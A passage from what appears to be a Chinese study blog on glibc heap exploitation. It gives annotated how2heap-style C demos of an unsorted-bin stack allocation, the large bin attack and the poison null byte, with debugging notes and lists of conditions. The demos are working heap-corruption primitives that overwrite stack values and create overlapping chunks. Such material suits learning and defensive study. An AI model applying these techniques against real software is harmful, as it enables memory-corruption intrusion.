stack&quot;</span>);</span><br><span class="line">    <span class="comment">// 设置下一次分配的大小并且把bk指针指向任意可写地址</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">    <span class="comment">// 现在假设我们有一个漏洞可以让我们覆写victim-&gt;size和victim-&gt;bk指针</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">    <span class="comment">// size必须和下一个请求的size不同以返回一个fake_chunk并且需要bypass 2*SIZE_SZ&gt;16 &amp;&amp; 2*SIZE&lt;av-&gt;system-&gt;mem 的检查</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line">victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们就可以返回我们的fake_chunk了</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-7"><a href="#运行结果及调试-7" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>依旧是断在了malloc完的情况，但是我这里不知道为什么多了一个0x411的chunk，这里我们直接忽略它就行</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513481257/0" alt="image-20210511165058888"></p><p>此时我们free掉了victim</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513486486/0" alt="image-20210511165202470"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513497857/0" alt="image-20210511165418590"></p><p>此时我们在栈上伪造了一个chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513533507/0" alt="image-20210511170116006"></p><p>然后我们修改了victim的size和它的bk，bk改成了我们伪造的chunk，size这里只要改小就行，这是为什么呢？</p><p>此时我们依旧修改了victim的bk，本来unsorted bin中只有一个chunk，但是我们修改了它的bk后，它就被误以为有两个chunk，也就是我们的fake_chunk被系统认为链入到了unsorted bin中，但是unsorted bin是先进先出的，所以是从0x20的开始取，但是大小不够，所以会将0x20的放入small bin中(符合small  bin大小)，然后从下一个也就是我们伪造的fake chunk去取，此时就符合</p><p>但是这里有个疑问就是unsorted bin中不是一个chunk的话，应该是会把所有chunk都放入适合大小的bin后在从bin中去取，比如我认为这里应该都会放入small bin中，而不是只有0x20的放入，但是我调试看似乎只有它放了，我也不知道为什么</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513650097/0" alt="image-20210511171915008"></p><h2 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2><p>程序先是在栈上定义了一个数组</p><p>随即分配了两个大小为0x100的chunk vitcim和chunk p1</p><p>紧接着释放了victim把他放进了unsorted bin中，之后在栈上伪造了一个fake chunk</p><p>最后修改了victim的Size和bk指针，将我们的fake chunk链入我们的unsorted bin中</p><p>此时我们再malloc一个合适大小的chunk就可以在我们的栈上malloc出来了</p><p>条件：</p><ol><li>两个chunk，其中一个只是防止与top chunk合并</li><li>一个放入victim中，修改size，修改bk为fake_chunk</li><li>栈上伪造一个chunk</li><li>malloc一个适合的chunk</li></ol><h1 id="0x09-large-bin-attack"><a href="#0x09-large-bin-attack" class="headerlink" title="0x09 large bin attack"></a>0x09 large bin attack</h1><h2 id="源代码-9"><a href="#源代码-9" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 本例以通过写一个大的无符号long型数值进入栈来演示large bin attack</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 在实际中，large bin attack也常常被用于更深层次的攻击，如覆写global_max_fast来为fastbin attack打辅助(为什么有一种看到了unsorted bin attack的错觉2333</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 我们要在栈上覆写的是stack_var1和stack_var2</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们有了第一个large chunk</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 然后申请一个fastbin chunk 来避免我们的第一个large chunk free的时候与下一个large chunk合并</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//现在是第二个large chunk</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//同理,防止第二个free的时候与下一个large chunk合并</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后我们分配第三个large chunk</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 这个fastbin是为了防止和top chunk合并</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="comment">// 现在我们free掉第一个和第二个large chunks,此时他们会被插入到unsorted bin中</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p2 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="comment">// 此时,我们申请一个小于被释放的第一个large chunk的chunk</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="comment">// 现在我们free第三个large chunk</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p3 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在假设我们有一个漏洞可以覆写被free的第二个large chunk的size,bk,bk_nextsize指针</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 现在我们减少被free的第二个large chunk来逼迫malloc将被free的第三个large chunk插入到large bin freelist的头部</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">    <span class="comment">// 为了覆写栈上的值,我们将在stack_var1前将bk设位16bytes,并在stack_var2前将bk_nextsize设为32bytes        </span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 让我们再malloc一次,这样被释放的large chunk就被插入到large bin freelist了</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">    <span class="comment">//在这期间,我们的目标已经被改写        </span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    assert(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-8"><a href="#运行结果及调试-8" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>分配完六个chunk后的堆块结构</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514630352/0" alt="image-20210511210104490"></p><p>释放了p1和p2之后</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514634416/0" alt="image-20210511210205159"></p><p>此时我们再申请一个小的chunk，就会把第二个free的chunk放入large bin中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514656787/0" alt="image-20210511210746116"></p><p>并且发现我们的unsorted bin中的chunk是经过切割的</p><p>经过调试发现其实在申请小的chunk的时候，会将这两个chunk都放入large bin中(符合large bin大小)，然后去large bin中去取合适的chunk，此时合适的chunk就是第一个free掉的，将其切割后，剩余的就会进入到unsorted bin中，就会变成上面这样。</p><p>此时我们再free掉p3</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514693470/0" alt="image-20210511211912928"></p><p>可以看到p3也进入了unsorted bin中，我们开始伪造p2</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514702324/0" alt="image-20210511212136686"></p><p>我们先修改了p2的size为0x3f1，然后fd为0，fd-&gt;nextsize为0，bk为&amp;stack_var1 - 2，而bk-&gt;nextsize为&amp;stack_var2-4</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13514819900/0" alt="image-20210511215816634"></p><p>可以看到此时我们已经修改了stack_var1和stack_var2</p><h2 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h2><p>本例中,程序先是在栈上创建了两个变量stack_var1和stack_var2并赋初值为0,这两个变量就是即将要被覆写的变量</p><p>随后申请了一个large chunk p1,然后又申请了一个小chunk来避免后面的操作引发合并,之后又申请了一个large chunk p2,之后还是一个避免合并的小chunk,下面申请p3的操作类似</p><p>随后程序释放了p1,p2,此时两个chunk被链入unsorted bin中</p><p>之后为了将p2放入large bin,程序又申请了一个小chunk对p1进行切割,一部分还给用户,一部分继续放进unsorted bin中,然后系统将p2放入了large bin中</p><p>之后Free掉了p3,现在p3也在unsorted bin中</p><p>好了,现在程序伪造了p2的内容,将p2-&gt;bk_nextsize指向stack2-4,p2-&gt;bk指向stack1-2</p><p>再malloc一个小chunk,这个时候程序就会将p3放入large bin中,系统就会调用从unsorted bin中取出large bin的操作,将堆地址存入栈上的地址</p><p>条件：</p><ol><li>先想办法将放入一个chunk到large bin中</li><li>unsorted bin中有两个chunk，这样可以触发将一个chunk放入large bin(当然要满足large bin的大小)</li><li>此时malloc的时候就会将unsorted bin中的chunk放入到large bin中，放入large bin就会触发它的排序，所以排序就会试我们的攻击成功？</li><li>这里需要改大小，不改程序就会崩，改大了stack1就没改，不知道为什么后面再调调看吧</li></ol><h1 id="0x10-poison-null-bytes"><a href="#0x10-poison-null-bytes" class="headerlink" title="0x10 poison null bytes"></a>0x10 poison null bytes</h1><p>这种攻击方式需要在没有tcache上进行</p><h2 id="源代码-10"><a href="#源代码-10" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* c;</span><br><span class="line"><span class="keyword">uint8_t</span>* b1;</span><br><span class="line"><span class="keyword">uint8_t</span>* b2;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"><span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">    <span class="comment">// 我们想溢出&#x27;a&#x27;的话，我们需要知道&#x27;a&#x27;的真实大小，因为舍入，&#x27;a&#x27;可能比0x100更大(我觉得这个舍入就是加了size,presize然后空间复用了一下</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line"><span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// chunk size属性的最小有效字节不能是0x00，最小的也必须是0x10，因为chunk的size包括请求的量加上元数据所需的大小(也就是我们的size和pre_size然后空间复用</span></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment"> * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// c我们分配了barrier,这样我们free c的时候就不会被合并到top chunk里了,这个burrier并不是必须的,只不过是为了减少可能产生的问题</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line"><span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在新版本的glibc中添加了新的check即: size==prev_next(next_chunk)</span></span><br><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// 这个被新增的check要求我们允许b中有null指针而不仅仅是c   </span></span><br><span class="line">    <span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">    <span class="comment">// 在新版本的glibc中我们需要让我们更新的size包含b自身去pass &#x27;chunksize(P)!=prev_size(next_chunk(P))&#x27;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line"><span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line"><span class="comment">// 我们将此位置设为0x200,因为0x200==(0x211&amp;0xff00)</span></span><br><span class="line">    <span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">    <span class="comment">// 这个是b.size的值在被null字节覆盖之后的值  </span></span><br><span class="line">    <span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个技术通过覆盖一个free chunk的元数据来生效</span></span><br><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 我们通过用一个null字节来溢出a来修改b的元数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个malloc将会在b上调用unlink</span></span><br><span class="line">     <span class="comment">// This malloc will result in a call to unlink on the chunk where b was.   </span></span><br><span class="line">     <span class="comment">//新增的chunk,如果没有像之前那样被正确处理,就会检测堆是否被损坏了                                  </span></span><br><span class="line">     <span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,                       </span></span><br><span class="line">     <span class="comment">// will detect the heap corruption now.                            </span></span><br><span class="line">     <span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where                                </span></span><br><span class="line">     <span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)               </span></span><br><span class="line">     <span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">     <span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">    <span class="comment">// 现在我们malloc b1,他将会被放在b的地方,此时,c的prev_size将会被更新</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line"><span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line"><span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line"><span class="comment">// 我们malloc b2作为我们的攻击目标</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line"><span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们释放b1和c,这将会合并b1和c(无视b2)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="comment">// 现在我们malloc d来和b2重叠</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line"><span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-9"><a href="#运行结果及调试-9" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>此时我们断在分配了a，b，c，barrier</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516493479/0" alt="image-20210512123452148"></p><p>然后我们修改了b+0x1f0位为0x200</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516503194/0" alt="image-20210512123736375"></p><p>然后此时我们释放chunk b</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516510930/0" alt="image-20210512124027482"></p><p>然后此时我们将b的size改为0x200，可以与上图对比</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516514191/0" alt="image-20210512124142621"></p><p>此时我们再次malloc的时候，因为b被视为free态，此时会调用unlink</p><p><img 